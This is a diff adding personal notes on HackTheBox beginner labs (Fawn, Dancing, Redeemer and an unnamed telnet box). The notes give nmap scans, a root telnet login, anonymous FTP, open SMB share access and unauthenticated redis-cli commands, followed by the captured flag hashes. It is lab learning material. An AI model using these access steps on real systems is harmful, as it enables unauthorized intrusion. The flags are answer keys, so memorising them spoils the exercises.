@@ -1,0 +1,46 @@
+# Learn the basics
+of Penetration Testing
+HackTheBox Learn the basics
+
+10.129.21.27
+telnet 10.129.21.27
+root
+
+## Fawn
+HackTheBox Fawn Walkthrough
+10.129.103.163
+
+nmap -sV 10.129.103.163
+nmap -sV -Pn 10.129.103.163
+
+ftp -v 10.129.103.163
+anonymous
+password
+get flag.txt
+exit
+cat flag.txt
+035db21c881520061c53e0536e44f815
+
+# Dancing
+HackTheBox Dancing Walkthrough
+10.129.199.43
+nmap -sV 10.129.199.43
+smbclient -L 10.129.199.43
+smbclient //10.129.199.43/WorkShares
+get James.P\flag.txt
+cat 'James.P\flag.txt'
+5f61c10dffbc77a704d76016a22f1664
+
+# Redeemer
+HackTheBox Redeemer Walkthrough
+10.129.3.125
+nmap -p- --min-rate 5000 -sV 10.129.3.125
+redis-cli
+redis-cli --help
+redis-cli -h 10.129.3.125
+info
+select
+select 0
+keys *
+get flag
+03e1d2b376c37ab3f5319922053953eb
